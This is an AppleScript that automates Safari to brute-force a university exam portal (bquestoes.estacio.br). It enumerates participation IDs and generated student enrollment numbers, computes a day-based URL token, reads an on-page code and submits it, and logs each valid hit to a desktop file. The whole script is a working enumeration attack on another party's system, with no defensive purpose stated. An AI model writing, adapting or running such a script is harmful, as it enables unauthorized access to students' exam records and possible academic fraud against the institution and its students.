tell application "Safari"
	activate
	delay 1
end tell

set pag to "http://bquestoes.estacio.br/entrada.asp?p0="
set jsCode to "window.frames[1].document.getElementsByClassName('linha_text_normal_000000').item(0).textContent;"
set codProva to ""
set matricula to ""
set pagLoop to ""
set matricula to 0.0

try
	set {year:y, month:m, day:d} to (current date)
	set m0 to y * 100 + m
	repeat with participacao from 4207851 to 4207852 --1932350 to 4400000
		set achou to false
		repeat with ano from y to 1998 by -1
			if achou then exit repeat
			repeat with mes from 12 to 1 by -1
				if achou then exit repeat
				set m1 to ano * 100 + mes
				repeat with m from 1 to 999999
					set matricula to m1 & add_leading_zeros(m, 5)
					set p0 to d * 8972370
					set msg to ""
					set pagLoop to pag & p0 & "&p1=" & matricula & "&p10=" & participacao
					tell application "Safari"
						set URL of first document to pagLoop
						delay 2
						
						set pagLoop to matricula
						
						set tempo to 0
						repeat
							delay 1 -- wait a second before checking again
							set tempo to tempo + 1
							set botaoCarga to do JavaScript "window.frames[1].document.getElementsByClassName('button').length;" in first document
							if tempo > 30 then exit repeat
							if botaoCarga > 0 then exit repeat
						end repeat
						if botaoCarga = 0 then
							set msg to "Página não carregada"
						end if
						set codProva to (do JavaScript jsCode in first document)
						delay 1
						do JavaScript "window.frames[1].document.forms['form']['codigo'].value = '" & codProva & "';" in first document
						delay 1
						do JavaScript "window.frames[1].document.forms['form']['Enviar'].click();" in first document
						
						delay 2
					end tell
					
					tell application "System Events" to tell process "Safari"
						tell front window
							if value of attribute "AXSubRole" is "AXDialog" then -- dialog opened.
								tell UI element 3
									set msg to value of attribute "AXValue"
								end tell
								perform action "AXPress" of button "OK" -- close the dialog
							end if
						end tell
					end tell
					
					tell application "Safari"
						delay 1
						set codProva to (do JavaScript "window.frames[1].document.getElementsByName('num_questoes').length;" in first document)
					end tell
					
					if msg = "" and codProva = 1 then
						do shell script "echo \"FOUND: " & pag & pagLoop & "\" >> /Users/educyn/Desktop/" & participacao & ".txt"
						set achou to true
						exit repeat
					else
						do shell script "echo \"ERROR: " & msg & " | " & pagLoop & "\" >> /Users/educyn/Desktop/" & participacao & ".txt"
					end if
				end repeat
			end repeat
		end repeat
	end repeat
	
on error errMsg number errNum
	set msg to errNum & "_" & errMsg
	do shell script "echo \"ERROR: " & msg & " | " & pagLoop & "\" >> /Users/educyn/Desktop/pagina.txt"
end try

display dialog "Script finalizado." buttons {"OK"} ¬
	default button "OK" giving up after 3

on add_leading_zeros(this_number, max_leading_zeros)
	set the threshold_number to (10 ^ max_leading_zeros) as integer
	if this_number is less than the threshold_number then
		set the leading_zeros to ""
		set the digit_count to the length of ((this_number div 1) as string)
		set the character_count to (max_leading_zeros + 1) - digit_count
		repeat character_count times
			set the leading_zeros to (the leading_zeros & "0") as string
		end repeat
		return (leading_zeros & (this_number as text)) as string
	else
		return this_number as text
	end if
end add_leading_zeros
